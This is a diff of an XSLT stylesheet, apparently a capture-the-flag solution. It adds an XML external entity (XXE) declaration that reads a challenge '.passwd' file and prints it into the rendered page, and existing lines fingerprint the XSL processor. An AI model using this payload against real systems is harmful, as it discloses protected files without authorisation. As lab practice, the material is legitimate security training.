@@ -1,4 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/challenge/web-serveur/ch50/.passwd ">]>
 <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
 <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
 <xsl:for-each select="beers/beer">
@@ -13,7 +14,7 @@
     </p>
   </div>
 </xsl:for-each>
-
+My file :  &ext_file;
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
